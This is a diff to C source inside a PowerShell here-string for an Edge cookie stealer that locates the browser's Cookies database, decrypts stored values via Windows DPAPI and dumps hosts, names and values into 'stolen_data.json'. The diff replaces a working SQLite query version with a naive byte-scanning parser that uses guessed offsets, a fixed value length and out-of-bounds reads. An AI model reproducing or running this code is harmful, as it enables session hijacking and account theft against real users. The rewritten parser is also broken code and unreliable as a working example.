@@ -27,10 +27,10 @@ $cProgram = @"
 #include <string.h>
 #include <windows.h>
 #include <wincrypt.h>
-#include <sqlite3.h>
 
 #pragma comment(lib, "crypt32.lib")
 
+// Function to decrypt Edge data
 char* decrypt_edge_data(const unsigned char* encrypted_value, int encrypted_len) {
     DATA_BLOB DataIn;
     DATA_BLOB DataOut;
@@ -49,47 +49,60 @@ char* decrypt_edge_data(const unsigned char* encrypted_value, int encrypted_len)
     return decrypted_value;
 }
 
-void get_edge_cookies() {
-    sqlite3* db;
-    sqlite3_stmt* stmt;
+// Function to read cookies from the file system
+void read_edge_cookies() {
     const char* db_path = getenv("LOCALAPPDATA");
     strcat(db_path, "\\Microsoft\\Edge\\User Data\\Default\\Cookies");
-    const char* sql = "SELECT host_key, name, encrypted_value FROM cookies";
 
-    if (sqlite3_open(db_path, &db) == SQLITE_OK) {
-        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
-            FILE* file = fopen("stolen_data.json", "w");
-            if (file) {
-                fprintf(file, "[\n");
-                int first = 1;
-                while (sqlite3_step(stmt) == SQLITE_ROW) {
-                    const char* host_key = (const char*)sqlite3_column_text(stmt, 0);
-                    const char* name = (const char*)sqlite3_column_text(stmt, 1);
-                    const unsigned char* encrypted_value = (const unsigned char*)sqlite3_column_blob(stmt, 2);
-                    int encrypted_len = sqlite3_column_bytes(stmt, 2);
-
-                    char* decrypted_value = decrypt_edge_data(encrypted_value, encrypted_len);
-                    if (decrypted_value) {
-                        if (!first) {
-                            fprintf(file, ",\n");
-                        }
-                        first = 0;
-                        fprintf(file, "  {\n    \"host\": \"%s\",\n    \"name\": \"%s\",\n    \"value\": \"%s\"\n  }", host_key, name, decrypted_value);
-                        free(decrypted_value);
-                    }
-                }
-                fprintf(file, "\n]\n");
-                fclose(file);
-                printf("Data saved locally at stolen_data.json\n");
-            }
-            sqlite3_finalize(stmt);
-        }
-        sqlite3_close(db);
+    FILE* file = fopen(db_path, "rb");
+    if (!file) {
+        printf("Failed to open cookies file.\n");
+        return;
     }
+
+    // Read the file content
+    fseek(file, 0, SEEK_END);
+    long file_size = ftell(file);
+    fseek(file, 0, SEEK_SET);
+
+    unsigned char* buffer = (unsigned char*)malloc(file_size);
+    fread(buffer, 1, file_size, file);
+    fclose(file);
+
+    // Parse the cookies (this is a simplified example and may not cover all cases)
+    FILE* output_file = fopen("stolen_data.json", "w");
+    if (output_file) {
+        fprintf(output_file, "[\n");
+        int first = 1;
+        for (long i = 0; i < file_size; i++) {
+            if (buffer[i] == 0x00 && buffer[i + 1] == 0x00 && buffer[i + 2] == 0x00 && buffer[i + 3] == 0x00) {
+                // Found a potential cookie entry (simplified check)
+                const char* host_key = (const char*)&buffer[i + 4];
+                const char* name = (const char*)&buffer[i + 20];
+                const unsigned char* encrypted_value = &buffer[i + 40];
+                int encrypted_len = 16; // Example length
+
+                char* decrypted_value = decrypt_edge_data(encrypted_value, encrypted_len);
+                if (decrypted_value) {
+                    if (!first) {
+                        fprintf(output_file, ",\n");
+                    }
+                    first = 0;
+                    fprintf(output_file, "  {\n    \"host\": \"%s\",\n    \"name\": \"%s\",\n    \"value\": \"%s\"\n  }", host_key, name, decrypted_value);
+                    free(decrypted_value);
+                }
+            }
+        }
+        fprintf(output_file, "\n]\n");
+        fclose(output_file);
+        printf("Data saved locally at stolen_data.json\n");
+    }
+
+    free(buffer);
 }
 
 int main() {
-    get_edge_cookies();
+    read_edge_cookies();
     return 0;
 }
 "@
